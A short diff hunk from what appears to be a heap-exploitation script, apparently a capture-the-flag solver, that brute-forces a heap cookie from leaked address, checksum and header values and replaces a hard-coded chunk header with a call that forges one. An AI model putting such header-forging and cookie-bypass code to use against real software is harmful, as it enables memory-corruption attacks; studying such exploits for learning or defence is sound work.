@@ -48,7 +48,7 @@ cookie = bruteforce(addr1, checksum1, header1 & ((1 << 0x30)-1))
 
 info(f"Cookie: {hex(cookie)}")
 
-new_header = 0x8100
+new_header = create_header(0, 8, 1)
 
 chunk_data = b""
 
